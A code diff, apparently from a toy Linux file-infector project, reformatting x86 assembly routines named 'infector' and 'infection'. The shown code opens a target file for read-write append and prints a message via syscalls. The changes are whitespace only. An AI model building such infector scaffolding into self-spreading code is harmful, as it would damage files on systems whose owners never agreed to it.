@@ -48,6 +48,7 @@ infector:
 	push    ebp             ; Save caller state
 	mov     ebp, esp
 	sub     esp, 4          ; Leave space for local var on stack
+
 	mov 	eax,5
 	mov 	ebx,[ebp+8]
 	mov     ecx, 1026   ; Next argument...
@@ -65,18 +66,19 @@ infector:
 	mov 	ebx,eax
 	mov 	eax,6
 	mov     eax, [ebp-4]    ; place returned value where caller can see it
+    
 	mov     esp, ebp          ; Restore caller state
 	pop     ebp             ; Restore caller state
 	ret                     ; Back to caller
 code_start:
 	infection:
-		push    ebp             ; Save caller state
+	    push    ebp             ; Save caller state
 		mov     ebp, esp
-		 sub     esp, 4          ; Leave space for local var on stack
-		 mov eax,4
-		 mov ebx,1
-		 mov ecx,msg
-		 mov edx,msg_size
+		sub     esp, 4          ; Leave space for local var on stack
+		mov eax,4
+		mov ebx,1
+		mov ecx,msg
+		mov edx,msg_size
 		int 0x80
 		
 		mov     eax, [ebp-4]    ; place returned value where caller can see it
